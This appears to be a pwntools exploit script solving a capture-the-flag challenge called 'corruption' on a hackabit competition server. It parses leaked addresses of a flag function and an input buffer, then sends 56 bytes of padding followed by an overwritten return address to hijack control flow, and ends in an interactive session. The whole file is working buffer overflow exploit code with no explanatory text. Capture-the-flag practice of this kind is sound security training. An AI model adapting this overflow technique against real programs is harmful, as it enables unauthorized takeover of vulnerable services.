from pwn import *

local = False

# Start the process
io = process('./corruption') if local else remote('juieqtrsdp.final.hackabit.com', 54321)

# Attach gdb to the process
if local:
    gdb.attach(io, '''
        break *main
        continue
    ''')

flag_function_leak = int(io.recvline()[21:].strip().decode('ascii'), 16)
input_buffer_leak = int(io.recvline()[21:].strip().decode('ascii'), 16)
print(f"got leak: {hex(flag_function_leak)} and {hex(input_buffer_leak)}")

padding = b'A' * 56

bitsandbytes_exploit = padding + p32(flag_function_leak)
controller_exploit = padding + p32(flag_function_leak+67)

io.sendafter(b"Talk to me Maverick: ", b'UNLOCK' + controller_exploit + b'\n')

# Interact with the process
io.interactive()
